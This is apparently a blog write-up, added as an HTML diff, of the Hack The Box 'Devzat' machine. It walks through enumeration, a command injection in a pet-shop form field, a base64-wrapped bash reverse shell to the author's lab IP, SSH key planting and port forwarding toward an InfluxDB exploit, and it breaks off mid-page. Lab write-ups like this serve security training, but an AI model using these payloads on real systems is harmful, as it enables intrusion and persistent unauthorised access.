@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Devzat Hackthebox writeup - My New Hugo Site</title><meta name="Description" content="This is 0xMesbaha"><meta property="og:url" content="http://example.org/posts/linux-machines/2022-03-11-devzat/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="Devzat Hackthebox writeup">
+  <meta property="og:description" content="In this Hackthebox we will get a user access through a command injection in a vhost , then will make port forwarding to find a service that will give us the password for another user who have access to some backups, in this backups we can find the source-code for a bot , the bot has 2 versions one of them is running locally and it has a command “file” which allows us to read any file on the sytsem we will make port forwarding one more time to read the root private key and login as root">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-03-11T00:45:12+09:00">
+    <meta property="article:modified_time" content="2022-03-11T00:45:12+09:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Rce">
+    <meta property="article:tag" content="Port-Forwarding">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Devzat Hackthebox writeup">
+  <meta name="twitter:description" content="In this Hackthebox we will get a user access through a command injection in a vhost , then will make port forwarding to find a service that will give us the password for another user who have access to some backups, in this backups we can find the source-code for a bot , the bot has 2 versions one of them is running locally and it has a command “file” which allows us to read any file on the sytsem we will make port forwarding one more time to read the root private key and login as root">
+      <meta name="twitter:site" content="@tinkerhell1337">
+<meta name="application-name" content="0xMesbaha">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/linux-machines/2022-03-11-devzat/" /><link rel="prev" href="http://example.org/posts/windows-machines/2022-02-25-driver/" /><link rel="next" href="http://example.org/posts/linux-machines/2022-03-26-secret/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Devzat Hackthebox writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/linux-machines\/2022-03-11-devzat\/"
+        },"genre": "posts","keywords": "Hackthebox, rce, Port forwarding","wordcount":  1133 ,
+        "url": "http:\/\/example.org\/posts\/linux-machines\/2022-03-11-devzat\/","datePublished": "2022-03-11T00:45:12+09:00","dateModified": "2022-03-11T00:45:12+09:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "0xMesbaha"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="My New Hugo Site">0xMesbaha</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="My New Hugo Site">0xMesbaha</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Devzat Hackthebox writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>0xMesbaha</a></span>&nbsp;<span class="post-category"> <a href="/categories/linux-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Machines</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-11">2022-03-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1133 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#discovery">Discovery</a></li>
+        <li><a href="#directory-busting">Directory Busting</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#enumerating-the-machine">Enumerating the machine</a>
+      <ul>
+        <li><a href="#port-forward">port forward</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#pwned">Pwned</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>In this Hackthebox we will get a user access through a command injection in a vhost , then will make port forwarding to find a service that will give us the password for another user who have access to some backups, in this backups we can find the source-code for a bot , the bot has 2 versions one of them is running locally and it has a command &ldquo;file&rdquo; which allows us to read any file on the sytsem we will make port forwarding one more time to read the root private key and login as root</p>
+<h1 id="scanning-">Scanning :</h1>
+<p>i will start with basic scanning :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A -T <span class="m">4</span> -sV 10.10.11.118
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.41
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://devzat.htb/
+</span></span><span class="line"><span class="cl">8000/tcp open  ssh     <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NULL:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    SSH-2.0-Go
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">3072</span> 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 <span class="o">(</span>RSA<span class="o">)</span></span></span></code></pre></div></div>
+<p>and we can see <code>devzat.htb</code> at the scan result so we can add it to the <code>/etc/hosts</code> and start fuzzing vhosts.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devzat.htb -H <span class="s2">&#34;Host: FUZZ.devzat.htb&#34;</span> -fc 302,404
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">pets                    <span class="o">[</span>Status: 200, Size: 510, Words: 20, Lines: 21<span class="o">]</span></span></span></code></pre></div></div>
+<p>we can add <code>pets.devzat.htb</code> also to the <code>/etc/hosts</code></p>
+<h1 id="enumeration-">Enumeration :</h1>
+<h3 id="discovery">Discovery</h3>
+<p>we can start enumerating the <strong>devzat.htb</strong> web application first. we can see it talks about some chat application and can try it with :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311134725.png"
+        data-srcset="/assets/images/devzat/20220311134725.png, /assets/images/devzat/20220311134725.png 1.5x, /assets/images/devzat/20220311134725.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311134725.png"
+        title="image" /></p>
+<p>so we can try it using :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -l Mesbaha  devzat.htb -p <span class="m">8000</span></span></span></code></pre></div></div>
+<p>looking for help to know how to use it :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311135035.png"
+        data-srcset="/assets/images/devzat/20220311135035.png, /assets/images/devzat/20220311135035.png 1.5x, /assets/images/devzat/20220311135035.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311135035.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311135132.png"
+        data-srcset="/assets/images/devzat/20220311135132.png, /assets/images/devzat/20220311135132.png 1.5x, /assets/images/devzat/20220311135132.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311135132.png"
+        title="image" /></p>
+<p>okay we will check it latter after we finish discovery phase</p>
+<p>visiting <strong>pets.devzat.htb</strong> we have the option to add new item</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311135355.png"
+        data-srcset="/assets/images/devzat/20220311135355.png, /assets/images/devzat/20220311135355.png 1.5x, /assets/images/devzat/20220311135355.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311135355.png"
+        title="image" /></p>
+<p>we can also see how the request is sent :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311135703.png"
+        data-srcset="/assets/images/devzat/20220311135703.png, /assets/images/devzat/20220311135703.png 1.5x, /assets/images/devzat/20220311135703.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311135703.png"
+        title="image" /></p>
+<p>okay now we have some leads , we can also start directory busting to check if there is something interesting</p>
+<h3 id="directory-busting">Directory Busting</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dirsearch -u http://devzat.htb/  -w /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>06:55:30<span class="o">]</span> <span class="m">301</span> -  309B  - /assets  -&gt;  http://devzat.htb/assets/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>06:55:35<span class="o">]</span> <span class="m">301</span> -  309B  - /images  -&gt;  http://devzat.htb/images/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>06:55:35<span class="o">]</span> <span class="m">200</span> -    6KB - /index.html
+</span></span><span class="line"><span class="cl"><span class="o">[</span>06:55:35<span class="o">]</span> <span class="m">301</span> -  313B  - /javascript  -&gt;  http://devzat.htb/javascript/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>06:55:40<span class="o">]</span> <span class="m">403</span> -  275B  - /server-status</span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dirsearch -u http://pets.devzat.htb/  -w /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>06:58:36<span class="o">]</span> <span class="m">200</span> -   23B  - /.git/HEAD
+</span></span><span class="line"><span class="cl"><span class="o">[</span>06:58:39<span class="o">]</span> <span class="m">301</span> -   42B  - /build  -&gt;  /build/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>06:58:40<span class="o">]</span> <span class="m">301</span> -   40B  - /css  -&gt;  /css/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>06:58:48<span class="o">]</span> <span class="m">403</span> -  280B  - /server-status</span></span></code></pre></div></div>
+<p>this <strong>/.git</strong> seems worthy to check</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311140209.png"
+        data-srcset="/assets/images/devzat/20220311140209.png, /assets/images/devzat/20220311140209.png 1.5x, /assets/images/devzat/20220311140209.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311140209.png"
+        title="image" /></p>
+<p>we need to download all of this and check them</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget -r http://pets.devzat.htb/.git/</span></span></code></pre></div></div>
+<p>once i am introduced with a <strong>.git</strong> i always use <a href="https://github.com/internetwache/GitTools" target="_blank" rel="noopener noreffer ">GitTools</a> to make the enumeration easier.</p>
+<p>i will start with the <strong>extractor</strong> to see broken repository commits and incompleted commits.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./extractor.sh pets.devzat.htb pets.dump</span></span></code></pre></div></div>
+<p>and we have these 3 commits :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>0-ef07a04ebb2fc92cf74a39e0e4b843630666a705  1-8274d7a547c0c3854c074579dfc359664082a8f6  2-464614f32483e1fde60ee53f5d3b4d468d80ff62</code></pre></div>
+<p>we can run the <strong>tree</strong> command to have an overview look , we will see a <strong>main.go</strong> in all the folders we can take a look at it and will find :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311141743.png"
+        data-srcset="/assets/images/devzat/20220311141743.png, /assets/images/devzat/20220311141743.png 1.5x, /assets/images/devzat/20220311141743.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311141743.png"
+        title="image" /></p>
+<p>it seems the &ldquo;<strong>species</strong>&rdquo; attribute which we sent in the <strong>pets.devzat.htb</strong> is not filtered before being passed to <strong>exec.Command</strong></p>
+<p>we can try some command injection and see if it works</p>
+<h1 id="foothold">Foothold</h1>
+<p>at the <strong>pets.devzat.htb</strong> page we can now try to add an item again but this time we will try to ping our host:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>{&#34;name&#34;:&#34;pingme&#34;,&#34;species&#34;:&#34;cat;ping -c 4 10.10.16.106&#34;}</code></pre></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311142344.png"
+        data-srcset="/assets/images/devzat/20220311142344.png, /assets/images/devzat/20220311142344.png 1.5x, /assets/images/devzat/20220311142344.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311142344.png"
+        title="image" /></p>
+<p>nice we got a reply , now Let&rsquo;s have a reverse shell !</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://media.giphy.com/assets/images/uNp22kQO4QCxa/giphy.gif"
+        data-srcset="https://media.giphy.com/assets/images/uNp22kQO4QCxa/giphy.gif, https://media.giphy.com/assets/images/uNp22kQO4QCxa/giphy.gif 1.5x, https://media.giphy.com/assets/images/uNp22kQO4QCxa/giphy.gif 2x"
+        data-sizes="auto"
+        alt="https://media.giphy.com/assets/images/uNp22kQO4QCxa/giphy.gif"
+        title="Alt Text" /></p>
+<p>however when i tried <code>sh -i &gt;&amp; /dev/tcp/10.10.16.106/9090 0&gt;&amp;1</code> it doesn&rsquo;t return a connection back so i though maybe the spaces and special characters are the reason .</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;sh -i &gt;&amp; /dev/tcp/10.10.16.106/9090 0&gt;&amp;1&#34;</span> <span class="p">|</span> base64
+</span></span><span class="line"><span class="cl"><span class="nv">c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA2LzkwOTAgMD4mMQo</span><span class="o">=</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311143241.png"
+        data-srcset="/assets/images/devzat/20220311143241.png, /assets/images/devzat/20220311143241.png 1.5x, /assets/images/devzat/20220311143241.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311143241.png"
+        title="image" /></p>
+<p>and finally :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311143301.png"
+        data-srcset="/assets/images/devzat/20220311143301.png, /assets/images/devzat/20220311143301.png 1.5x, /assets/images/devzat/20220311143301.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311143301.png"
+        title="image" /></p>
+<p>spawn a tty shell:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span><span class="line"><span class="cl">ctrl+z
+</span></span><span class="line"><span class="cl">stty raw -echo <span class="p">;</span><span class="nb">fg</span>
+</span></span><span class="line"><span class="cl">Enter key x2
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm</span></span></code></pre></div></div>
+<p>and we have a nice shell as <strong>patrick</strong> user on the machine</p>
+<h2 id="enumerating-the-machine">Enumerating the machine</h2>
+<p>at the <code>/etc/passwd </code> we can see this strange <strong>backup</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</code></pre></div>
+<p>we can visit this <strong>/var/backups/</strong> maybe it contains useful information can help us escalate our privilege</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311151418.png"
+        data-srcset="/assets/images/devzat/20220311151418.png, /assets/images/devzat/20220311151418.png 1.5x, /assets/images/devzat/20220311151418.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311151418.png"
+        title="image" /></p>
+<p>But only user <strong>catherine</strong> can use it so we should find a way to escalate to this user first :(</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>-rw-------  1 catherine catherine 28297 Jul 16  2021 devzat-dev.zip
+-rw-------  1 catherine catherine 27567 Jul 16  2021 devzat-main.zip</code></pre></div>
+<p>if we run <code>ss-lpnut</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:5000          0.0.0.0:*               LISTEN      836/./petshop
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8086          0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8443          0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::80                   :::*                    LISTEN      -
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN      -
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::8000                 :::*                    LISTEN      837/./devchat</span></span></code></pre></div></div>
+<p>we can see port <strong>8443</strong> and port <strong>8086</strong> are running locally , and there is no netcat on the machine to know what are the services running. so we have to make port forward to see the ports running.</p>
+<h3 id="port-forward">port forward</h3>
+<p>forward port <strong>8086</strong> from the machine to your side.</p>
+<p><em>first:</em> generate ssh keys</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh-keygen  -f devzat</span></span></code></pre></div></div>
+<p>and put your public key at the <strong>authorized_keys</strong> on the machine side</p>
+<p><em>Second</em>: forward the port :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># at your side</span>
+</span></span><span class="line"><span class="cl">ssh  -i devzat -N -L 8086:127.0.0.1:8086  patrick@devzat.htb</span></span></code></pre></div></div>
+<p>now if we have scanned our localhost will find :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311162554.png"
+        data-srcset="/assets/images/devzat/20220311162554.png, /assets/images/devzat/20220311162554.png 1.5x, /assets/images/devzat/20220311162554.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311162554.png"
+        title="image" /></p>
+<p>if we search for this version of the service will find immediatley <a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933" target="_blank" rel="noopener noreffer ">this</a> exploit</p>
+<p><img
